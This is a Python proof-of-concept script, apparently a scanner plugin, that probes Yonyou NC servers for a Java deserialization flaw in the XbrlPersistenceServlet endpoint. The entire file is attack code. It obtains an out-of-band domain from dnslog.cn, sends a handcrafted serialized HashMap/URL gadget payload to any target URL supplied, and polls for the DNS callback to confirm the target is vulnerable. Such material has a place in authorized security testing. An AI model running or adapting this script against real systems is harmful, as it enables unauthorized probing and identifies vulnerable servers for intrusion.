'''
Function:
    yonyounc 反序列化漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import re
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def get_dnslog(self):
        url = "http://dnslog.cn/getdomain.php"
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        result = requests.get(url=url, headers=headers, verify=False)
        cookie = re.search("(.*);", result.headers.get('Set-Cookie')).group(1)
        return result.text, cookie

    def get_result(self, cookie):
        url = "http://dnslog.cn/getrecords.php"
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Cookie': cookie
        }
        result = requests.get(url=url, headers=headers, verify=False)
        return result.text

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, scheme, netloc):
        dnslog_all = self.get_dnslog()
        dnslog = dnslog_all[0]
        url = "{}://{}/service/~xbrl/XbrlPersistenceServlet".format(scheme, netloc)
        data = "\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x03L\x00\x04hostq\x00~\x00\x03L\x00\x08protocolq\x00~\x00\x03L\x00\x03refq\x00~\x00\x03xp\xff\xff\xff\xff\xff\xff\xff\xfft\x00\x10" + dnslog + "t\x00\x00q\x00~\x00\x05t\x00\x04httppxt\x00\x17http://" + dnslog + "x"
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
            if result.status_code == 200 and result.text == "":
                for i in range(5):
                    dnslog_result = self.get_result(dnslog_all[1])
                if dnslog_result != "[]":
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在反序列化漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.result_text += "\n\n                 {}".format(data)
                    return True
                else:
                    return False
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        result = self.vuln(netloc=netloc, scheme=scheme)
        if result:
            return self.result_text
        else:
            return False

